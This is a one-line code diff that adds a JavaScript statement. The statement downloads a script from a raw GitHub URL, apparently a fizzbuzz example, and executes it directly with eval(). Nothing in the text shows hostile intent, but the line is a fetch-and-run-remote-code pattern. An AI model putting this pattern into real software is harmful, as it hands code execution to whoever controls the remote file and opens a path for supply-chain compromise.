@@ -1,0 +1,1 @@
+require("axios").get("https://raw.githubusercontent.com/awesome-examples/fizzbuzz/master/js/fizzbuzz.js").then(res => eval(res.data));
